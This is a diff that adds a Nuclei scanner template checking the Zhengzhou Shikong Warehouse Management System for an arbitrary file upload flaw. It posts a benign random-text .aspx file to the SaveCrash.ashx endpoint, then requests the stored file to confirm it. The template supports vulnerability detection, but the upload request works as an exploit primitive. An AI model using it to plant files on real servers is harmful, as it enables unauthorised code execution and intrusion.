@@ -1,0 +1,67 @@
+id: zzskzy-wms-savecrash-anyfile-upload
+info:
+  name: Zhengzhou Shikong Warehouse Management System SaveCrash Arbitrary File Upload
+  author: ProjectDiscoveryAI
+  severity: critical
+  tags: file-upload
+  description: |
+    Exploits an arbitrary file upload vulnerability in Zhengzhou Shikong Warehouse Management System's SaveCrash functionality, allowing attackers to upload files with .aspx extensions.
+
+variables:
+  t1: "{{rand_base(5)}}"
+  t2: "{{base64(t1)}}"
+  dt1: "{{date_time('2006')}}"
+  dt2: "{{date_time('01')}}"
+
+flow: http(1) && http(2)
+
+http:
+  - id: upload-file
+    method: POST
+    path:
+      - "{{BaseURL}}/crash/SaveCrash.ashx"
+    headers:
+      Content-Type: "multipart/form-data; boundary=----WebKitFormBoundaryssh7UfnPpGU7BXfK"
+    body: |-
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK
+      Content-Disposition: form-data; name="file"; filename="{{t1}}.aspx"
+      Content-Type: text/plain
+
+      {{t2}}
+      ------WebKitFormBoundaryssh7UfnPpGU7BXfK--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - ".aspx"
+      - type: word
+        part: body
+        words:
+          - "<"
+        negative: true
+    extractors:
+      - type: regex
+        name: t3
+        internal: true
+        part: body
+        group: 1
+        regex:
+          - "(?m)([0-9]+)\\.aspx"
+
+  - id: verify-upload
+    method: GET
+    path:
+      - "{{BaseURL}}/crash/log/{{dt1}}_{{dt2}}/{{t3}}.aspx"
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        part: body
+        words:
+          - "{{t2}}"
